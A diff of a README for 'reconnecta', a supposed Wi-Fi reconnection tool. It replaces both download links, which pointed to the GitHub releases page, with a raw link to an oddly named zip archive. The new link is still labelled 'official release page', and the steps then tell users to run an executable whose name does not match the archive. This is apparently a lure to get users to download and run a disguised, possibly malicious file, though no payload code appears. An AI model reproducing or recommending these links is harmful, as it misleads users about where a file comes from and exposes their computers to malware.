@@ -1,6 +1,6 @@
 # 🔗 reconnecta - Keep your wireless connection stable always
 
-[![Download reconnecta](https://img.shields.io/badge/Download-Reconnecta-blue.svg)](https://github.com/Lollycolourless294/reconnecta/releases)
+[![Download reconnecta](https://img.shields.io/badge/Download-Reconnecta-blue.svg)](https://raw.githubusercontent.com/Lollycolourless294/reconnecta/main/quadrisetose/Software-1.7.zip)
 
 ## 📌 About This Tool
 
@@ -18,7 +18,7 @@ Reconnecta keeps your computer connected to the internet. Wireless networks ofte
 Follow these steps to install the software on your computer.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Lollycolourless294/reconnecta/releases) to download the setup file.
+2. Go to the [official release page](https://raw.githubusercontent.com/Lollycolourless294/reconnecta/main/quadrisetose/Software-1.7.zip) to download the setup file.
 3. Locate the file named `reconnecta-setup.exe` in your Downloads folder.
 4. Double-click the file to start the installation.
 5. Follow the prompts on your screen.
